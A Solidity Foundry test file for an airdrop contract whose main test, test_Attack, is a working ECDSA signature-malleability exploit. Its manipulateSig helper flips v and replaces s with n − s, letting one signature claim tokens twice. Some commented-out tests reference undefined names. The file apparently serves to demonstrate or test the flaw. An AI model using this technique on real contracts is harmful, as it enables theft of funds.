// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {Airdrop} from "../src/Airdrop.sol";

import {FuzzToken} from "../src/FuzzToken.sol";

contract AirdropTest is Test {
    Airdrop public airdrop;
    FuzzToken public fuzzToken;

    uint256 ownerPrivateKey = uint256(keccak256("ownerPrivateKey"));
    address owner = vm.addr(ownerPrivateKey);
    uint256 user1privatkey = uint256(keccak256("user1privatkey"));
    address user1 = vm.addr(user1privatkey);
    address user2 = makeAddr("2");
    address user3 = makeAddr("3");
    address user4 = makeAddr("4");
    address user0 = address(1);
    address attacker = makeAddr("attacker");
    

    uint256 totalsupply = 10000;
    function setUp() public {
        
        vm.startPrank(user0);
        fuzzToken = new FuzzToken(100000000);
        vm.label(address(fuzzToken), "FuzzToken");
        airdrop = new Airdrop(address(fuzzToken), 11011);
        vm.label(address(airdrop), "Airdrop Contract");

        vm.label(owner, "Owner");
        vm.label(user1, "User1");
        vm.deal(user1, 2 ether);
        vm.stopPrank();
    }

//     function test_CannotRegisterMoreThanOnce() public {
//         vm.prank(user1);
//         airdrop.register();

//         vm.prank(user1);
//         vm.expectRevert();
//         airdrop.register();
//     }

//     function test_claim() public {
//         vm.prank(user1);
//         airdrop.register();

//         vm.prank(user2);
//         airdrop.register();

//         vm.prank(user3);
//         airdrop.register();

//         vm.prank(user4);
//         airdrop.register();

//         vm.startPrank(user1);
//         airdrop.claim();
//         //User1 should not be able to claim more than once
//         vm.expectRevert();
//         airdrop.claim();

//     }

//     function test_claimWithSig() public {
//         vm.prank(user1);
//         airdrop.register();

//         vm.prank(user2);
//         airdrop.register();

//         vm.prank(user3);
//         airdrop.register();

//         vm.prank(user4);
//         airdrop.register();

        
//         bytes32 domainSeparator = airdrop.getDOMAIN_SEPARATOR();
//         bytes32 hash = keccak256(abi.encode(keccak256("claimWithSignature(address to)"), user1));

//         bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, hash));

//         (uint8 v, bytes32 r, bytes32 s) = vm.sign(user1privatkey, digest);

//         vm.prank(owner);
//         airdrop.claimWithSignature(user1, v, r, s);

//         assertEq(GAUcoin.balanceOf(user1), totalsupply/4);

//         //Should not be able to claim twice for same user
//         vm.startPrank(owner);
//         vm.expectRevert();
//         airdrop.claimWithSignature(user1, v, r, s);

//         //A signature shouldn't be used to sign for another user

//         vm.expectRevert();
//         airdrop.claimWithSignature(user2, v, r, s);

//     }

    function test_Attack() public {
        vm.prank(user1);
        airdrop.registerForAirdrop();

        vm.prank(user2);
        airdrop.registerForAirdrop();

        vm.prank(user3);
        airdrop.registerForAirdrop();

        vm.prank(user4);
        airdrop.registerForAirdrop();

        
        bytes32 domainSeparator = airdrop.getDOMAIN_SEPARATOR();
        bytes32 hash = keccak256(abi.encode(keccak256("claimWithSig(address to)"), user1));

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, hash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(user1privatkey, digest);

        vm.prank(user0);
        fuzzToken.approve(address(airdrop), 100000);
        airdrop.claimWithSig(user1, v, r, s);

        assertEq(fuzzToken.balanceOf(user1), 100);
        //Should not be able to claim twice for same user
        vm.startPrank(user0);
        vm.expectRevert();
        airdrop.claimWithSig(user1, v, r, s);

        //A signature shouldn't be used to sign for another user
        (uint8 modV, bytes32 modR, bytes32 modS) = manipulateSig(v,r,s);
        airdrop.claimWithSig(user1, modV, modR, modS);
        assertEq(fuzzToken.balanceOf(user1), 200);

    }

    
    function manipulateSig(uint8 v, bytes32 r, bytes32 s) public pure returns(uint8, bytes32, bytes32){

        uint8 manipulate_V;
        uint256 num = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;

        if(v % 2 == 0){
           manipulate_V = v - 1;
        }
        else{
            manipulate_V = v + 1;
        }
        bytes32 manipulate_S = bytes32(num - uint256(s));
        return (manipulate_V, r, manipulate_S);
    }
    

}